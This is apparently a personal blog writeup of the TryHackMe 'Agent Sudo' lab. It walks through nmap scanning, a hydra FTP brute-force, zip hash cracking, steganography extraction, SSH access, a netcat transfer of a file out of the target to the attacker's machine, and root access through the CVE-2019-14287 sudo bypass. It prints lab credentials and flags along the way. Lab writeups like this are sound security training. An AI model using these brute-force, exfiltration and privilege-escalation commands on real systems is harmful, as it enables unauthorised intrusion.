---
tagline: agentsudo
title: Agent Sudo - Writeup
description: Mom, I think there are aliens outside...
banner: /blog/agentsudobanner.jpeg/
banner_alt: better late than never, better late than never
date: '2024-03-4'
---

## Nmap

```bash:Terminal
┌──(vipin㉿vipin)-[~]
└─$ sudo nmap -sS -sV 10.10.137.85
[sudo] password for vipin: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-03 22:53 EST
Nmap scan report for 10.10.137.85
Host is up (0.094s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.10 seconds
```

- 3 open ports

## Enumerate cont'd

- To redirect to the secret page, we need to modify the **user-agent** using cURL. I used the command ```curl -A <useragent> 10.10.137.85 -L``` and trying *R* as a user agent shows this.

![Image showing result of R](/blog/agentsudopics/useragentcurl.png 'Fig.1')

- When we try C we get this

![Image showing result of C](/blog/agentsudopics/chris.png 'Fig.2')

- Now we know his name is chris and that his password is weak (not actually weak)

## Hash cracking and brute-force

- I cracked the FTP Password using this command ```hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.194.92 -V```

![Image showing ftp cracked](/blog/agentsudopics/ftpcracked.png 'Fig.3')

- Next is logging into the ftp server with ```ftp user@ip```. Inside we find a txt file that reads

```txt:Text Editor
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

- Lets also ```get``` the other images. Inside *cutie.png*, we find a zip file (binwalk'ed) that is password protected.

```bash:Terminal
┌──(vipin㉿vipin)-[~/Downloads]
└─$ zip2john 8702.zip > 8702.hash
                                                                                                      
┌──(vipin㉿vipin)-[~/Downloads]
└─$ john 8702.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 ASIMD 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:02 DONE 2/3 (2024-03-04 21:35) 0.4975g/s 22230p/s 22230c/s 22230C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- Inside the zip file was a txt file named *To_agentR.txt* which says this

```txt:Text Editor
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

- It seem like the text is in base64

```bash:Terminal
┌──(vipin㉿vipin)-[~/Downloads]
└─$ echo 'QXJlYTUx' | base64 -d
Area51           
```

- Now that we have the steg password lets extract text the other image

```bash:Terminal
┌──(vipin㉿vipin)-[~]
└─$ steghide --extract -p Area51 -sf cute-alien.jpg
wrote extracted data to "message.txt".

┌──(vipin㉿vipin)-[~]
└─$ cat message.txt                                                                   
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

- Thats a LOT of information, enough to get us to the next section.

## Capture the user flag

```bash:Terminal
┌──(vipin㉿vipin)-[~]
└─$ ssh james@10.10.194.92                         
The authenticity of host '10.10.194.92 (10.10.194.92)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.194.92' (ED25519) to the list of known hosts.
james@10.10.194.92's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Mar  5 02:49:58 UTC 2024

  System load:  0.0               Processes:           92
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 31%               IP address for eth0: 10.10.194.92
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
```

- Now for the next question, utilizing netcat I transfered the file to my vm

```bash:Terminal
james@agent-sudo:~$ nc -w 5 10.6.22.229 6969 < /home/james/Alien_autospy.jpg

# on another window

┌──(vipin㉿vipin)-[~/Desktop]
└─$ nc -lvnp 6969 > Alien_autopsy.jpg
```

- Now using google search, we find this various results but no fox news, but using the other articles I learned that some guy named Roswell faked an alien autopsy which gives us the answer *roswell alien autopsy*.

## Privilege escalation

> it's the most wonderful time of the Machine

- We start by running ```find / -uid 0 -perm -4000 -type f 2>/dev/null``` to find exploitable SUID Binaries and sudo seems to be one.

```bash:Terminal
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

- A little searching find us [this](https://www.exploit-db.com/exploits/47502) exploit which tells us the CVE (CVE-2019-14287) & how to privilege escalate!

```bash:Terminal
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# cat /root/root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

### MACHINE PWN'ED 😎

![My Tryhackme badge yuh](https://tryhackme-badges.s3.amazonaws.com/vipin.b.png)
